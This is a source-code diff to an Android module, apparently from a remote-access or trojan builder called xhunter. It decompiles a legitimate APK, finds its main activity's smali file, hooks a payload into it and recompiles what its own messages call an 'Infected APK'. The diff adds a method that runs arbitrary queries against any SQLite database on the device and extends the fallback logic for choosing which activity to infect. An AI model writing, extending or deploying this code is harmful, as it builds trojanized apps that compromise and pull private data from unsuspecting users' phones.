@@ -1,8 +1,11 @@
 package com.xhunter;
 
 import android.content.res.AssetManager;
+import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
 import android.os.Build;
 import android.os.Environment;
+import android.util.Base64;
 import android.util.Log;
 
 import androidx.annotation.RequiresApi;
@@ -14,7 +17,10 @@ import com.facebook.react.bridge.Promise;
 import com.facebook.react.bridge.ReactApplicationContext;
 import com.facebook.react.bridge.ReactContextBaseJavaModule;
 import com.facebook.react.bridge.ReactMethod;
+import com.facebook.react.bridge.WritableArray;
 import com.facebook.react.bridge.WritableMap;
+import com.facebook.react.bridge.WritableNativeArray;
+import com.facebook.react.bridge.WritableNativeMap;
 import com.jcraft.jsch.JSch;
 import com.jcraft.jsch.JSchException;
 import com.jcraft.jsch.Session;
@@ -102,7 +108,33 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
             promise.reject("e","[!] Failed to stop secure ssh tunnel");
         }
     }
-
+    @ReactMethod
+    public void readDB(String path, String query, Promise promise){
+        try{
+            SQLiteDatabase db = SQLiteDatabase.openDatabase( path, null,0);
+            Cursor res = db.rawQuery(query, null);
+            res.moveToFirst();
+            WritableArray list = new WritableNativeArray();
+            while(res.isAfterLast() == false){
+                int index=0;
+                WritableMap obj = new WritableNativeMap();
+                while(index<res.getColumnCount()){
+                    if(res.getType(index)==4){
+                        obj.putString(res.getColumnName(index), Base64.encodeToString(res.getBlob(index), Base64.DEFAULT));
+                    }else{
+                        obj.putString(res.getColumnName(index),res.getString(index));
+                    }
+                    index++;
+                }
+                list.pushMap(obj);
+                res.moveToNext();
+            }
+            promise.resolve(list);
+            res.close();
+        } catch (SecurityException e){
+            e.printStackTrace();
+        }
+    }
     @ReactMethod
     public void loadResources(Promise promise){
         File workingDirectory = new File(working_dir);
@@ -224,9 +256,9 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         WritableMap params = Arguments.createMap();
         params.putString("message", "[+] Decompiled Successfully !");
         try {
-            String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
+            //String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
             //Main.main(new String[]{"d", "-p", framework, "-f", targetApkPath , "-o", working_dir+"normal_apk", });
-            Main.main(new String[]{"d","-r","-f", working_dir+"payload.apk", "-o", working_dir+"payload", });
+            Main.main(new String[]{"d","-r","-f", targetApkPath , "-o", working_dir+"normal_apk", });
             promise.resolve(params);
         } catch (Exception e) {
             e.printStackTrace();
@@ -269,6 +301,7 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
             String manifestXml = apkFile.getManifestXml();
             String smali_hook_path = getHookSmaliPath(manifestXml);
             if(smali_hook_path != null) {
+                Log.e("Found smali path :", smali_hook_path);
                 hook_payload(working_dir+"normal_apk/smali/"+smali_hook_path);
                 promise.resolve(params);
             }else{
@@ -284,7 +317,7 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
         WritableMap params = Arguments.createMap();
         params.putString("message", "[+] Compiled Infected APK Successfully !");
         try {
-            String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
+            //String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
            // Main.main(new String[]{"b","-a", getAapt(),"-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
            Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk", });
             promise.resolve(params);
@@ -329,6 +362,7 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
 
     private String getHookSmaliPath(String manifestXml) {
         String hook_smali_path=null;
+        List<String> smali_path_list = new ArrayList<>();
         try{
             XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
             factory.setNamespaceAware(true);
@@ -343,15 +377,14 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
                        while (i<xpp.getAttributeCount()) {
                            if (xpp.getAttributeName(i).equals("name")) {
                                smali_path=xpp.getAttributeValue(i);
+                               smali_path_list.add(smali_path);// collect all actitivity
                            }
                            i++;
                        }
                        while (eventType != XmlPullParser.END_TAG) {
                             xpp.next();
                            if ((xpp.getName() != null) && (xpp.getEventType() != XmlPullParser.END_TAG) && (xpp.getName().equals("action"))) {
-                               System.out.println("Action ------> " + xpp.getAttributeValue(0));
                                if (xpp.getAttributeValue(0).equals("android.intent.action.MAIN")) {
-                                   Log.e("Found smali path :", smali_path);
                                    hook_smali_path = smali_path.replaceAll("\\.","/")+".smali";
                                }
                            }//action
@@ -365,6 +398,19 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
             }
         }catch (XmlPullParserException | IOException e){
             e.printStackTrace();
+        }
+        if(hook_smali_path == null){
+            if(smali_path_list.size()>0){
+                int i=0;
+                String tmp_path="";
+                while (i<smali_path_list.size()){
+                    tmp_path = smali_path_list.get(i).replaceAll("\\.","/")+".smali";
+                    if( new File(working_dir+"normal_apk/smali/"+tmp_path).exists()){ //if no suitable path found return first activity path
+                        return tmp_path;
+                    }
+                    i++;
+                }
+            }
         }
         return hook_smali_path;
     }
